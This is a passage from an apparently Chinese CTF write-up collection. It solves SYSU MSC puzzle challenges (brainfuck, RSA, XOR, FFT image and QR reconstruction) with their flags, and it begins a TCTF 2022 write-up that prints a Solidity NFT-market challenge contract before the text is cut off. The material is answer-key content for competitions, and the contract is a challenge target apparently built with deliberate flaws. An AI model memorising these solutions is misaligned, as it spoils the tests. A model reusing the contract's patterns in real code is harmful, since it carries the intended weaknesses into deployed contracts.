<pre><code>+++++++[-&gt;+++++++&lt;]&gt;++++++++++++.&lt;+++++[-&gt;+++++&lt;]&gt;+.++.&lt;+++++[-&gt;+++++&lt;]&gt;++++++.+.&lt;+++++[-&gt;-----&lt;]&gt;--.-------.+.&lt;++++[-&gt;----&lt;]&gt;-------.&lt;+++++++[-&gt;+++++++&lt;]&gt;.----.&lt;++++++++[-&gt;--------&lt;]&gt;------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++++++.++.+++++++++.&lt;+++[-&gt;---&lt;]&gt;---.&lt;++++++++[-&gt;--------&lt;]&gt;---------------.&lt;+++[-&gt;+++&lt;]&gt;+++.&lt;+++++++[-&gt;+++++++&lt;]&gt;+++++++++++++.&lt;++++++[-&gt;------&lt;]&gt;-----------.&lt;++++++++[-&gt;++++++++&lt;]&gt;++.&lt;++++++++[-&gt;--------&lt;]&gt;--.&lt;+++++[-&gt;+++++&lt;]&gt;+++.&lt;++++++[-&gt;------&lt;]&gt;.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++.&lt;++++++[-&gt;------&lt;]&gt;----------.++++++.&lt;+++++[-&gt;+++++&lt;]&gt;+.&lt;+++++++[-&gt;-------&lt;]&gt;---------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++++++++++.&lt;+++++++[-&gt;-------&lt;]&gt;----.--.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++.-----.&lt;++++++++[-&gt;--------&lt;]&gt;-.&lt;++++++[-&gt;++++++&lt;]&gt;+.&lt;+++++[-&gt;+++++&lt;]&gt;.+++.++++++.&lt;+++++++[-&gt;-------&lt;]&gt;----------.---..&lt;+++++++[-&gt;+++++++&lt;]&gt;+++++++++++++.&lt;+++[-&gt;---&lt;]&gt;-.------.&lt;+++[-&gt;+++&lt;]&gt;+++.&lt;++++++++[-&gt;--------&lt;]&gt;------------.&lt;+++[-&gt;+++&lt;]&gt;+++.+.&lt;+++++++[-&gt;+++++++&lt;]&gt;+++++++++++.++++.++++++.&lt;+++++[-&gt;-----&lt;]&gt;----------.&lt;+++++[-&gt;-----&lt;]&gt;---------.-----.++++++.&lt;++++[-&gt;----&lt;]&gt;.&lt;++++[-&gt;++++&lt;]&gt;++++++++.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++++.&lt;++++++++[-&gt;--------&lt;]&gt;---..&lt;++++[-&gt;----&lt;]&gt;.&lt;+++++[-&gt;+++++&lt;]&gt;+.&lt;++++[-&gt;++++&lt;]&gt;+++++.&lt;+++++[-&gt;-----&lt;]&gt;.-------.-------.--------.&lt;++++[-&gt;++++&lt;]&gt;+++++.-----..&lt;++++[-&gt;----&lt;]&gt;.&lt;++++[-&gt;++++&lt;]&gt;++++.&lt;+++[-&gt;---&lt;]&gt;-.++++.+++.&lt;+++++[-&gt;+++++&lt;]&gt;++++++.&lt;++++[-&gt;----&lt;]&gt;------.++++.&lt;++++[-&gt;++++&lt;]&gt;+++++++.&lt;++++++[-&gt;------&lt;]&gt;-----------.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++.&lt;+++++++[-&gt;-------&lt;]&gt;-------.----.------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++++++++++.&lt;++++++++[-&gt;--------&lt;]&gt;--------..&lt;++++++[-&gt;++++++&lt;]&gt;+++++.&lt;+++++[-&gt;+++++&lt;]&gt;++++.--.&lt;+++++[-&gt;-----&lt;]&gt;--------.&lt;+++++[-&gt;-----&lt;]&gt;---.---------.&lt;+++[-&gt;+++&lt;]&gt;++++.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++.+++++++++.&lt;++++++++[-&gt;--------&lt;]&gt;----------------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++.+++.&lt;++++++++[-&gt;--------&lt;]&gt;-------.&lt;+++++++[-&gt;+++++++&lt;]&gt;+++++++++++++.&lt;+++++++[-&gt;-------&lt;]&gt;--------.&lt;+++[-&gt;---&lt;]&gt;---.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++.&lt;+++[-&gt;+++&lt;]&gt;+++.&lt;++++++++[-&gt;--------&lt;]&gt;.++++++++.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++++++++++++.&lt;+++++[-&gt;-----&lt;]&gt;-.&lt;+++++++[-&gt;-------&lt;]&gt;----.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++++++++++.+.&lt;++++[-&gt;----&lt;]&gt;-----.&lt;+++++++[-&gt;-------&lt;]&gt;--.&lt;+++++++[-&gt;+++++++&lt;]&gt;+.&lt;+++++[-&gt;-----&lt;]&gt;-------.-----.-.&lt;+++++++[-&gt;+++++++&lt;]&gt;+.&lt;+++++++[-&gt;-------&lt;]&gt;------.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++..&lt;+++[-&gt;---&lt;]&gt;---.&lt;+++[-&gt;+++&lt;]&gt;++++.&lt;++++++++[-&gt;--------&lt;]&gt;------------.-------.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++++.++.&lt;+++++[-&gt;+++++&lt;]&gt;+++++++++.----.-------.&lt;+++[-&gt;+++&lt;]&gt;++.&lt;+++[-&gt;---&lt;]&gt;----.++++++..+.&lt;++++++++[-&gt;--------&lt;]&gt;-----------.&lt;++++[-&gt;++++&lt;]&gt;+++++.&lt;+++++++[-&gt;+++++++&lt;]&gt;+++++++++++.&lt;+++++++++[-&gt;---------&lt;]&gt;----------.&lt;+++++[-&gt;+++++&lt;]&gt;+++.&lt;+++++++[-&gt;+++++++&lt;]&gt;+++++++.&lt;\n</code></pre></p> <p>brainfuck \u8f93\u51fa\u5f97\u5230\uff1a<code>=WYxy^WXArn(qs|p!-k&lt;~&lt;X4i;A[!n97zu4Yru{@=={qkw+78tx~[94:*By66&amp;@U&lt;5.&amp;;66&amp;:047V@D[,r:60}55^{yX&lt;3@u~.sv/m4(]i)1pV!op[(Z:54f/ssgt(!XZ|xq|ouuv+@|!=u</code></p> <p>\u6839\u636e\u9898\u9762\u7684\u51ef\u6492\uff0c\u53ef\u4ee5\u63a8\u6d4b\u662f ASCII \u504f\u79fb\uff0c\u7136\u540e\u628a\u8f93\u51fa\u9650\u5236\u5728 [33, 126] \u4e2d\uff08ASCII\u53ef\u89c1\u5b57\u7b26\uff09\uff0c\u7b2c 54 \u6b21\u504f\u79fb\u7684\u7ed3\u679c\uff1a<code>v24ST923zMIaLNWKZfFuYu3mDtz6ZIrpUPm4MPVyvvVLFRdpqOSY6rmsc{Too_y0ung_too_simp1y}6eMsoiXnn9VT3ulyPYgNQhHma8DbjK1ZJK6a5snmAhNNBOaZ35WSLWJPPQdyWZvP</code></p> <p>\u4e2d\u95f4\u5c31\u662f flag\uff1a<code>msc{Too_y0ung_too_simp1y}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_17","title":"\u4e00\u4e2a\u4f20\u8bf4","text":"<p>\u201c\u52c7\u58eb\uff0c\u6211\u542c\u8fc7\u4e00\u4e2a\u53e4\u8001\u7684\u4f20\u8bf4\u2026\u2026\u201d \u201c\u8bf7\u8bb2\uff01\u201d \u300c1024\u00d7768 \u5927\u5c0f\u7684\u56fe\u7247\uff0c\u53ef\u4ee5\u8f7b\u677e\u85cf\u4e0b 786432 \u4e2a\u5730\u5740\u3002\u300d https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/justcolor.png</p> <p>\u4e00\u4e2a\u7eaf\u8272\u6587\u4ef6\uff0c\u6839\u636e\u9898\u9762\u53ef\u4ee5\u63a8\u6d4b\u662f\u8bfb\u53d6 rgba \u503c\u4f5c\u4e3a ip \u5730\u5740</p> <p>\u6240\u4ee5\u5199\u4e2a\u811a\u672c\u8bfb\u4e00\u4e0b <code>from PIL import Image;print(Image.open(\"justcolor.png\").getpixel((0, 0)))</code>\uff0c\u5f97\u5230 ip \u5730\u5740\uff1a116.63.166.50</p> <p>\u8bbf\u95ee\u5f97\u5230 flag\uff1a<code>msc{Hide_IP_in_RGBA}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_18","title":"\u65f6\u95f4\u5546\u4eba","text":"<p>\u4f60\u53d1\u73b0\u4e86\u4e00\u5757\u5e03\u6ee1\u82d4\u85d3\u7684\u77f3\u677f\uff0c\u4e0a\u9762\u523b\u7740\u4e0b\u9762\u7684\u51e0\u4e2a\u5b57\uff1a \u2003\u22a7\u00e3\u22b7\u00ac\u00a7\u00d7\u00e3\u02c6\ud835\udd0e \u4f60\u770b\u4e0d\u61c2\uff0c\u4f46\u5927\u53d7\u9707\u64bc\u3002 \u8def\u8fb9\u6709\u4e2a\u795e\u79d8\u7684\u9ed1\u8863\u5546\u4eba\uff0c\u4ed6\u81ea\u79f0\u80fd\u4e3a\u4f60\u63d0\u4f9b\u5e2e\u52a9\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u82db\u523b\u7684\u6761\u4ef6\uff1a\u4f60\u5fc5\u987b\u5728\u6bcf\u5929\u51cc\u6668\u56db\u70b9\u7684\u7b2c\u4e00\u4e2a\u516b\u5206\u949f\u5185\u8fc7\u6765\u627e\u4ed6\uff0c\u4ed6\u624d\u80fd\u7ed9\u4f60\u63d0\u4f9b\u7ebf\u7d22\u3002</p> <p>\u8c03\u6574\u65f6\u95f4\u5230\u51cc\u6668\u56db\u70b9\u7684\u7b2c\u4e00\u4e2a\u516b\u5206\u949f\u5185\uff0c\u5f97\u5230 hint\uff1a<code>\u5546\u4eba\u770b\u7740\u4f60\uff0c\u4ec0\u4e48\u8bdd\u4e5f\u6ca1\u8bf4\uff0c\u7ed9\u4f60\u9012\u4e86\u4e00\u5f20\u7eb8\u6761\uff0c\u4e0a\u9762\u5199\u7740\uff1acharref\u3002</code></p> <p>\u641c\u7d22\u5f97\u5230\u5b57\u7b26\u5bf9\u7167\u8868\uff1ahttps://dev.w3.org/html5/html-author/charref</p> <p>\u7136\u540e\u4f9d\u6b21\u641c\u7d22\u8fd9\u4e9b\u5b57\u7b26\uff0c\u9996\u5b57\u6bcd\u62fc\u8d77\u6765\u5c31\u662f flag\uff1a<code>msc{mainstacK}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_19","title":"\u8ffd\u8e2a\u76ee\u6807","text":"<p>\u4e00\u5f20\u901a\u7f09\u4ee4\u8d34\u5728\u6751\u53e3\u7684\u516c\u544a\u724c\u4e0a\uff0c\u636e\u8bf4\u6355\u83b7\u5230\u4e86\u76d7\u8d3c\u4e0b\u4e00\u6b21\u8981\u4f5c\u6848\u7684\u5730\u65b9\uff0c\u4f46\u6ca1\u4eba\u770b\u5f97\u61c2\u3002 7PMM399R+FQ2 \u201c\u54e6\uff0c\u4f60\u53ea\u9700\u8981\u7528**********\u5c31\u80fd\u5f97\u5230\u7b54\u6848\u201d \u201c\u54e6\uff01\u6536\u5230\uff01\u201d \u201c\u4f60\u77e5\u9053 The simplest way to talk about location \u5417\uff1f\u201d \u201c\u77e5\u9053\u2026\u2026\u539f\u6765\u4f60\u5c31\u662f\u60f3\u8981\u90a3\u4e09\u4e2a\u5355\u8bcd\u554a\u201d</p> <p>\u76f4\u63a5\u4f7f\u7528\u4e09\u8bcd\u5730\u5740\u8c03\u6210\u82f1\u6587\u641c\u7d22 <code>7PMM399R+FQ2</code> \u5f97\u5230\u4f4d\u7f6e\u7684\u4e09\u4e2a\u5355\u8bcd <code>///flux.tank.pitch</code></p> <p>\u6240\u4ee5 flag\uff1a<code>msc{flux_tank_pitch}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_20","title":"\u7d27\u6025\u5524\u9192","text":"\u95ee\u9898 <pre><code>from Crypto.Util.number import*\n\np = 0xbb1a21ab46e16672a6dfe537c5d03121252685a1a72fab827ed14d61caa80f68b9bda9fb0d9651719ab099d05fd0da03443a50106533f1034a81e280cd3e85fd\nq = 0x85eed89c104292b715a45ec8a1c3328506b429c2b7477c9ab094313fcf0020ba7352b102608cab79bde92978aedb052a546fb289c453feac87ee791ba1019579\n\nn = p * q\ne = 0x10001\n\nanswer = b'something you dont know'\nm = bytes_to_long(answer)\n\nc = pow(m,e,n)\n# c = 0x17c7af1ec9c020eb9d8f26049f002b58f93591a817ebff4c00e9e46254261db54a2c2d086dd0f532994329faf2133b1c7002913b187f898d87c8093b2290440e927 78956c60b92f27e3dc4d15b4c79f97b79bca253b0b4542375c37f8e37e1f8e38d728634133376eacd2c448aa523b2eda0b4c5f2af47250147f4193d58596c\n</code></pre> <p>\u57fa\u7840\u7684 RSA\uff0c\u8ba1\u7b97\u51fa d \u7136\u540e\u89e3\u5bc6\u5c31\u53ef\u4ee5\u5f97\u5230 flag\uff1a <pre><code>d = pow(e, -1, (p-1) * (q-1))\nprint(long_to_bytes(pow(c, d, n)))\n# b'msc{W0w_You_know_H0w_to_d3crypt_the_RSA}'\n</code></pre></p>"},{"location":"writeups/sysu_msc_puzzle/#emojis","title":"Emojis","text":"<p>\u201c\u8fd9\u662f\u4e00\u4e32 <code>EMOJI</code>\uff0c\u91cc\u9762\u4f1a\u85cf\u7740\u4ec0\u4e48\u6837\u7684\u4fe1\u606f\u5462\uff1f\u201d \ud83d\ude43\ud83d\udcb5\ud83c\udf3f\ud83c\udfa4\ud83d\udeaa\ud83c\udf0f\ud83d\udc0e\ud83e\udd4b\ud83d\udeab\ud83d\ude06\u2705\ud83d\ude0a\ud83d\udc49\ud83d\udc63\ud83d\udcc2\u23e9\ud83d\ude06\ud83c\udf3f\ud83c\udf2a\ud83d\ude0e\ud83c\udf75\u2603\ud83d\udcc2\ud83d\udeb9\ud83d\udc4c\ud83c\udff9\ud83d\udc0e\ud83c\udf3f\ud83d\ude00\ud83d\udc63\ud83c\udfce\ud83d\ude0d\ud83d\ude06\ud83c\udf74\u2705\ud83d\udc41\u2705\u2705\ud83d\ude06\ud83d\udd79\ud83d\udd2c\ud83d\udc0d\ud83c\udf85\u2716\ud83c\udf2a\ud83d\udc63\ud83d\udeb9\ud83d\udca7\ud83c\udf74\ud83d\udcb5\ud83c\udf4d\ud83c\udf2a\u2709\ud83d\udc41\ud83d\udeaa\ud83d\udd2a\u23e9\ud83d\udca7\ud83c\udf83\ud83e\udd4b\ud83d\udd79\ud83c\udf4e\ud83d\ude0a\u2139</p> <p>\u54e6\u5bf9\u4e86\uff0c\u6211\u8981\u7684\u662f\u5ffd\u7565\u8bef\u5dee\u540e\u7684\u6570\u5b57\u54e6~</p> <p>DevTools \u91cc\u53ef\u4ee5\u770b\u5230 display: none \u7684 aes\uff1f\u6240\u4ee5\u5e94\u8be5\u662f\u4f7f\u7528 emoji-aes</p> <p>\u6839\u636e\u9898\u9762\u4e2d\u7684\u5168\u5927\u5199\u3001\u4ee3\u7801\u5757\u5305\u88f9\u7684 <code>EMOJI</code>\uff0c\u53ef\u4ee5\u63a8\u6d4b\u51fa key \u5c31\u662f EMOJI\uff0c\u89e3\u5bc6\u5f97\u5230\uff1a <pre><code>ORANGE\nRED\nYELLOW\nGREEN\nGOLD\n</code></pre></p> <p>\u6839\u636e\u989c\u8272\u4ee5\u53ca\u9898\u9762\u4e2d\u7684\u201c\u5ffd\u7565\u8bef\u5dee\u201d\u731c\u6d4b\u662f\u4e94\u8272\u73af\u7535\u963b\uff0c\u8f6c\u6362\u5f97\u5230\u5ffd\u7565\u8bef\u5dee\u540e\u662f 32400000 \u6b27\u59c6\uff0c\u6240\u4ee5 flag\uff1a<code>msc{32400000}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_21","title":"\u7b80\u6613\u52a0\u5bc6","text":"<p>\u636e\u8bf4\u8fd9\u662f\u4e00\u79cd\u6781\u5176\u666e\u904d\u7684\u52a0\u5bc6\u65b9\u6cd5\u2026\u2026 \u800c\u4e14\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u5bc6\u2026\u2026 \u6216\u8bb8\u2026\u2026\u4f60\u53ef\u4ee5\u542c\u5230\u6765\u81ea\u7b54\u6848\u7684\u58f0\u97f3\u2026\u2026 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc.enc</p> <p>\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u5bc6\u7684\u7b80\u6613\u52a0\u5bc6\uff0c\u53ef\u4ee5\u731c\u6d4b\u662f\u5f02\u6216\uff0c\u7136\u540e\u6253\u5f00\u770b\u5341\u516d\u8fdb\u5236\u53d1\u73b0\u5f88\u591a <code>0x66</code>\uff0c\u6240\u4ee5\u8003\u8651\u5168\u90e8\u5f02\u6216 <code>0x66</code>\uff1a <pre><code>import struct\nres = []\nwith open(\"msc.enc\", \"rb\") as f:\n    while True:\n        c = f.read(1)\n        if not c:\n            break\n        res.append(ord(c) ^ 0x66)\n\nwith open(\"res.bin\", \"wb\") as f:\n    for each in res:\n        f.write(struct.pack(\"B\", each))\n</code></pre> \u5f97\u5230\u7684 res.bin \u4e2d\u53ef\u4ee5\u5f88\u5bb9\u6613\u53d1\u73b0 <code>FL Keys</code> \u548c\u4e00\u4e9b\u952e\u540d\uff0c\u7528 fl \u6216\u8005\u5e93\u4e50\u961f\u7b49\u8f6f\u4ef6\u6253\u5f00\u5c31\u53ef\u4ee5\u770b\u5230 flag\uff1a<code>msc{The_xor_midi_GIFT}</code></p>"},{"location":"writeups/sysu_msc_puzzle/#_22","title":"\u56fe\u50cf\u5904\u7406\u5927\u5e08","text":"<p>\u4f60\u5c31\u662f\u56fe\u50cf\u5904\u7406\u5927\u5e08\uff01 \u6240\u4ee5\u5e2e\u6211\u627e\u5230\u85cf\u5728\u56fe\u7247\u91cc\u7684\u79d8\u5bc6\u5427\uff01\u54e6\u5bf9\u4e86\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u5f20\u5c0f\u7eb8\u6761\uff0c\u5e94\u8be5\u80fd\u5e2e\u5230\u4f60\uff08 <code>0.8560967955058971 17.682512473330895</code> https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/cv.zip</p> \u9898\u76ee\u4ee3\u7801 <pre><code>import cv2\nimport numpy as np\n\ndef mapping(data, down=0, up=255, tp=np.uint8):\n    data_max = data.max()\n    data_min = data.min()\n    interval = data_max - data_min\n    new_interval = up - down\n    new_data = (data - data_min) * new_interval / interval + down\n    new_data = new_data.astype(tp)\n    return new_data\n\ndef fft(img):\n    fft = np.fft.fft2(img)\n    fft = np.fft.fftshift(fft)\n    m = np.log(np.abs(fft))\n    p = np.angle(fft)\n    return m, p\n\nif __name__ == '__main__':\n    img = cv2.imread(f'answer.png', cv2.IMREAD_GRAYSCALE)\n\n    m, p = fft(img)\n    print(m.min(), m.max())\n\n    new_img1 = mapping(m)\n    new_img2 = mapping(p)\n\n    cv2.imwrite(f'cv1.png', new_img1)\n    cv2.imwrite(f'cv2.png', new_img2)\n</code></pre> <p>\u4e00\u4e2a FFT\uff0c\u76f4\u63a5\u628a\u4ee3\u7801\u9006\u56de\u53bb\u5c31\u597d\u4e86\uff1a <pre><code>import cv2\nimport numpy as np\n\ndef mapping(data, down=0, up=255, tp=np.uint8):\n    data_max = data.max()\n    data_min = data.min()\n    interval = data_max - data_min\n    new_interval = up - down\n    new_data = (data - data_min) * new_interval / interval + down\n    new_data = new_data.astype(tp)\n    return new_data\n\nif __name__ == '__main__':\n    img1 = cv2.imread(\"cv1.png\", cv2.IMREAD_GRAYSCALE)\n    img2 = cv2.imread(\"cv2.png\", cv2.IMREAD_GRAYSCALE)\n\n    m = mapping(img1, 0.8560967955058971, 17.682512473330895)\n    p = mapping(img2, 0, 2*np.pi)\n    res = m * (np.cos(p) + np.sin(p) * 1j)\n\n    ishift = np.fft.ifftshift(res)\n    iimg = np.fft.ifft2(ishift)\n    iimg = np.abs(iimg)\n    iimg = mapping(iimg)\n    cv2.imwrite(f'answer.png', iimg)\n</code></pre></p> flag: msc{The_master_of_cv} <p></p>"},{"location":"writeups/sysu_msc_puzzle/#_23","title":"\u6df7\u4e71\u7684\u4e8c\u7ef4\u7801","text":"<p>\u4f60\u597d\uff01\u52c7\u58eb\uff0c\u4f60\u8d70\u5230\u8fd9\u91cc\u5df2\u7ecf\u8bc1\u660e\u4e86\u4f60\u7684\u5b9e\u529b\uff01 \u6211\u672c\u8be5\u7ed9\u4f60\u7684\u662f\u4e00\u5f20\u8bb0\u5f55\u7740\u7b54\u6848\u7684\u4e8c\u7ef4\u7801\uff0c\u4f46\u7531\u4e8e\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u6211\u4eec\u5fd8\u8bb0\u6807\u6ce8\u6bcf\u4e00\u884c\u7684\u987a\u5e8f\u4e86\uff0c\u5bfc\u81f4\u6211\u4eec\u6536\u5230\u4e86\u8fd9\u6837\u7684\u6570\u636e\u2026\u2026\u52c7\u58eb\uff0c\u4f60\u80fd\u8fd8\u539f\u51fa\u5b83\u7684\u539f\u59cb\u6a21\u6837\u5417\uff1f</p> \u9898\u76ee <pre><code>[\n  \"10111010111000011000001011101\", \"00111010110010101000000000010\",\n  \"11100001101100100001011010110\", \"10000010000111101111111111101\",\n  \"10111010000010001000001011101\", \"01110011010111001001011100001\",\n  \"10101101110101001110000110010\", \"10111010111010111110001011101\",\n  \"10010100110101101111100111110\", \"10111110011101011000011010111\",\n  \"11001010001011011000000001000\", \"10111010100101100111111110100\",\n  \"10000010110010110100100011001\", \"11111110101010101010101111111\",\n  \"10111010001100010100110110111\", \"11111110101101010101110110000\",\n  \"00000000100100100101100011100\", \"00000000111001101011011111001\",\n  \"11111100100110010010001011110\", \"00010001110001001101110001010\",\n  \"10000010111110001101101000001\", \"11001110110110010101100100001\",\n  \"11011110111101111101111110100\", \"11111110100010100101101011100\",\n  \"00000000011111011001100000000\", \"10111010111001000110010100010\",\n  \"11111110101110011001001111111\", \"10000010001100011010101000001\",\n  \"10011111111101000101110010111\"\n]\n</code></pre> <p>\u628a\u8fd9\u4e9b\u503c\u8f93\u5165\u5230 csv \u4e2d\uff0c\u7136\u540e Excel \u6253\u5f00\uff0c\u8c03\u4e00\u8c03\u683c\u5f0f\uff0c\u5f00\u59cb\u6309\u7167\u4e8c\u7ef4\u7801\u7684\u89c4\u5219\uff08\u4e09\u4e2a\u5b9a\u4f4d\u70b9\uff0c\u5bf9\u9f50\u56fe\u6837\u3001\u65f6\u5e8f\u56fe\u6837\u7b49\uff09\u6765\u786e\u5b9a\u53ef\u4ee5\u786e\u5b9a\u7684\u884c\uff0c\u7ed3\u679c\uff1a  </p> <p>\u4e0a\u9762\u6709 2 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff0c\u4e2d\u95f4\u6709 11 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff08\u5176\u4e2d\u7531\u4e8e\u65f6\u5e8f\u56fe\u6837\u7684\u539f\u56e0\uff0c\u6240\u4ee5\u76f8\u5f53\u4e8e\u6709 5 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\u548c 6 \u884c\u987a\u5e8f\u4e0d\u786e\u5b9a\uff09\uff0c\u6240\u4ee5\u603b\u5171\u6709 <code>2*5!*6! = 172800</code> \u79cd\u53ef\u80fd\uff0c\u6240\u4ee5\u53ef\u4ee5\u679a\u4e3e\u4e86\u3002\u53ef\u4ee5\u4f7f\u7528 pyzbar \u8fd9\u4e2a\u5305\u6765\u81ea\u52a8\u89e3\u4e8c\u7ef4\u7801</p> <p>\u6539\u4e00\u6539 GZTime 2021 \u7965\u4e91\u676f\u7684 writeup \u91cc\u7684\u4ee3\u7801\uff1a</p> \u4ee3\u7801 <pre><code>data = [\n    \"11111110101110011001001111111\",\n    \"10000010111110001101101000001\",\n    \"10111010111010111110001011101\", # &lt;- \u8fd9\u4e24\u884c\u9700\u8981\u624b\u52a8\u8c03\u6362\u5404\u8dd1\u4e00\u6b21\n    \"10111010000010001000001011101\",\n    \"10111010111000011000001011101\", # &lt;- \u8fd9\u4e24\u884c\u9700\u8981\u624b\u52a8\u8c03\u6362\u5404\u8dd1\u4e00\u6b21\n    \"10000010001100011010101000001\",\n    \"11111110101010101010101111111\",\n    \"00000000011111011001100000000\",\n    \"10011111111101000101110010111\",\n    \"11100001101100100001011010110\",\n    \"00111010110010101000000000010\",\n    \"10101101110101001110000110010\",\n    \"01110011010111001001011100001\",\n    \"10010100110101101111100111110\", \n    \"10111110011101011000011010111\",\n    \"00000000111001101011011111001\",\n    \"11001010001011011000000001000\",\n    \"11111100100110010010001011110\",\n    \"11001110110110010101100100001\",\n    \"00010001110001001101110001010\",\n    \"11011110111101111101111110100\",\n    \"00000000100100100101100011100\",\n    \"11111110100010100101101011100\",\n    \"10000010110010110100100011001\",\n    \"10111010100101100111111110100\",\n    \"10111010111001000110010100010\",\n    \"10111010001100010100110110111\",\n    \"10000010000111101111111111101\",\n    \"11111110101101010101110110000\"\n]\n\nimport pyzbar.pyzbar as pyzbar\nfrom itertools import permutations\nfrom PIL import Image, ImageDraw as draw\nimport matplotlib.pyplot as plt\nfrom tqdm import tqdm\n\nshuffle_1 = [9, 11, 13, 15, 17, 19]\nshuffle_2 = [10, 12, 14, 16, 18]\n\nhead = data[:9]\ntail = data[20:]\n\ndef body(body_1, body_2): # \u83b7\u53d6\u4e2d\u95f4\u90e8\u5206\u7684\u4e00\u79cd\u6392\u5217\n    body = []\n    for i in range(5):\n        body.append(body_1[i])\n        body.append(body_2[i])\n    body.append(body_1[5])\n    return [data[i] for i in body]\n\ndef draw_img(data): # \u751f\u6210\u4e8c\u7ef4\u7801\u56fe\u7247\n    assert len(data) == 29 and len(data[0]) == 29\n    img = Image.new('RGB', (31, 31), (255,255,255))\n    for i, row in enumerate(data):\n        for j, pixel in enumerate(row):\n            img.putpixel((j + 1, i + 1), (0,0,0) if pixel == \"1\" else (255,255,255))\n    return img\n\nwith tqdm(total=86400) as pbar:\n    for body_1 in permutations(shuffle_1):\n        for body_2 in permutations(shuffle_2):\n            im = draw_img(head + body(body_1, body_2) + tail)\n            barcodes = pyzbar.decode(im)\n            pbar.update(1)\n            if(len(barcodes) == 0):\n                continue\n\n            for barcode in barcodes:\n                barcodeData = barcode.data.decode(\"utf-8\")\n                print(barcodeData)\n                plt.imshow(im)\n                plt.show()\n</code></pre> <p>\u53ef\u4ee5\u8dd1\u51fa\u53ef\u89e3\u7684\u4e8c\u7ef4\u7801\u548c flag\uff1a</p> flag\uff1amsc{You_ar3_g0od_4t_QR_Code} <p></p>"},{"location":"writeups/tctf2022/","title":"TCTF/0CTF 2022 RisingStar Writeup","text":"<p> \u7ea6 2519 \u4e2a\u5b57  323 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p> <p>Abstract</p> <p>TCTF/0CTF 2022 \u7684\u65b0\u661f\u8d5b\u9053\u548c\u56fd\u9645\u8d5b\u9053\uff0cmisc \u9898\u6709\u56db\u9053\u662f\u540c\u4e00\u4e2a\u9644\u4ef6\u7684\u56db\u4e2a flag\uff0c\u5f88 reverse\uff0c\u6ca1\u600e\u4e48\u505a\u3002\u53ea\u548c\u56db\u8001\u5e08\u4e00\u8d77\u505a\u4e86 ETH \u7684\u9898\uff0c\u8fd8\u662f\u6bd4\u8f83\u6709\u8da3\u7684</p>"},{"location":"writeups/tctf2022/#tctf-nft-market","title":"TCTF NFT Market","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.15;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n\ncontract TctfNFT is ERC721, Ownable {\n    constructor() ERC721(\"TctfNFT\", \"TNFT\") {\n        _setApprovalForAll(address(this), msg.sender, true);\n    }\n\n    function mint(address to, uint256 tokenId) external onlyOwner {\n        _mint(to, tokenId);\n    }\n}\n\ncontract TctfToken is ERC20 {\n    bool airdropped;\n\n    constructor() ERC20(\"TctfToken\", \"TTK\") {\n        _mint(address(this), 100000000000);\n        _mint(msg.sender, 1337);\n    }\n\n    function airdrop() external {\n        require(!airdropped, \"Already airdropped\");\n        airdropped = true;\n        _mint(msg.sender, 5);\n    }\n}\n\nstruct Order {\n    address nftAddress;\n    uint256 tokenId;\n    uint256 price;\n}\nstruct Coupon {\n    uint256 orderId;\n    uint256 newprice;\n    address issuer;\n    address user;\n    bytes reason;\n}\nstruct Signature {\n    uint8 v;\n    bytes32[2] rs;\n}\nstruct SignedCoupon {\n    Coupon coupon;\n    Signature signature;\n}\n\ncontract TctfMarket {\n    event SendFlag();\n    event NFTListed(\n        address indexed seller,\n        address indexed nftAddress,\n        uint256 indexed tokenId,\n        uint256 price\n    );\n\n    event NFTCanceled(\n        address indexed seller,\n        address indexed nftAddress,\n        uint256 indexed tokenId\n    );\n\n    event NFTBought(\n        address indexed buyer,\n        address indexed nftAddress,\n        uint256 indexed tokenId,\n        uint256 price\n    );\n\n    bool tested;\n    TctfNFT public tctfNFT;\n    TctfToken public tctfToken;\n    CouponVerifierBeta public verifier;\n    Order[] orders;\n\n    constructor() {\n        tctfToken = new TctfToken();\n        tctfToken.approve(address(this), type(uint256).max);\n\n        tctfNFT = new TctfNFT();\n        tctfNFT.mint(address(tctfNFT), 1);\n        tctfNFT.mint(address(this), 2);\n        tctfNFT.mint(address(this), 3);\n\n        verifier = new CouponVerifierBeta();\n\n        orders.push(Order(address(tctfNFT), 1, 1));\n        orders.push(Order(address(tctfNFT), 2, 1337));\n        orders.push(Order(address(tctfNFT), 3, 13333333337));\n    }\n\n    function getOrder(uint256 orderId) public view returns (Order memory order) {\n        require(orderId &lt; orders.length, \"Invalid orderId\");\n        order = orders[orderId];\n    }\n\n    function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) {\n        